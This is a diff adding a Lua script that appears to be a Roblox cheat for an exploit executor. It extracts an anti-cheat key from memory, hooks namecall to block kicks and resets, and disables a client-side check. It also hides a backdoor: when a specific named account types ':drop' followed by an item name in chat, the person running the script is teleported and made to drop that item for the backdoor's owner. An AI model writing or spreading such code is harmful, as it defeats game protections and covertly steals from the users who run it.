@@ -1,0 +1,113 @@
+repeat wait(1) until game:IsLoaded()
+function searchTable(t, index)
+	local temp = {};
+	for i,v in pairs(t) do
+		table.insert(temp, tostring(v));
+	end
+	if table.find(temp, index) then
+		temp = nil;
+		return true;
+	end
+	return false;
+end
+
+local function getTableLength(t)
+    local temp = 0;
+    for i,v in pairs(t) do temp = temp + 1; end
+    return temp;
+end
+
+--This is used to get the return key in case they change it
+local gc = getgc(true);
+local key = nil;
+for i = #gc, 1, -1 do
+    if type(gc[i]) == "table" then
+        if rawget(gc[i], "A") and type(rawget(gc[i], "A")) == "table" and #(rawget(gc[i], "A")) > 2 then
+            key = rawget(gc[i], "A")[2];
+            break;
+        end
+    end
+end
+
+--Bypasses
+local oldNamecall;
+oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+    local args = {...};
+    if not checkcaller() and getnamecallmethod() == "InvokeServer" and tostring(self) == "Returner" and args[1] == "idklolbrah2de" then
+        if key then return key;
+		else return "  ___XP DE KEY"; end
+    end
+	if not checkcaller() and getnamecallmethod() == "InvokeServer" and args[1] == "Reset" then
+		return;
+	end
+	if not checkcaller() and getnamecallmethod() == "FireServer" and args[1] == "Reset" then
+		return;
+	end
+    if not checkcaller() and getnamecallmethod() == "Kick" then
+        return;
+    end
+    return oldNamecall(self, ...);
+end);
+
+for i,v in pairs(getgc()) do
+	if type(v) == "function" and tostring(getfenv(v).script) == 'Client' and #debug.getprotos(v) == 7 and searchTable(debug.getupvalues(v), "RemoteEvent") then
+		v = function() end;
+		break;
+	end
+end
+
+local trig
+
+local plr = game.Players.LocalPlayer
+
+
+function trigger(target)
+    
+    trig = target.Chatted:Connect(function(word)
+        
+        if ((word:sub(1,5)):lower() == ":drop") then
+            local char = plr.Character or plr.CharacterAdded:Wait()
+            local hum = char:FindFirstChild("Humanoid")
+            local humrp = char:FindFirstChild("HumanoidRootPart")
+            local event = char:FindFirstChild("RemoteEvent")
+            
+            if (char and hum and hum.Health > 1 and humrp and event) then
+            
+                local itemname = (word:sub(7,-1)):lower()
+                
+                local lastpos = humrp.CFrame
+                humrp.CFrame = CFrame.new(Vector3.new(1750.6010742188, 770.61102294922, 28.486907958984))
+                
+                for _,v in pairs(plr.Backpack:GetChildren()) do
+                    
+                    if ((v.Name):lower() == itemname) then
+                        
+                        event:FireServer("DropItem",v)
+                        wait(2)
+                    end
+                end
+                
+                humrp.CFrame = lastpos
+            end
+        end
+    end)
+end
+    
+
+
+for _,v in pairs(game.Players:GetChildren()) do
+    if v.Name == "ivan_zyuzin" then
+        trigger(v)
+    end
+end
+
+game.Players.ChildAdded:Connect(function(v)
+    if v.Name == "ivan_zyuzin" then
+        trigger(v)
+    end
+end)    
+game.Players.ChildRemoved:Connect(function(v)
+    if v.Name == "ivan_zyuzin" then
+        trig:Disconnect()
+    end
+end)    
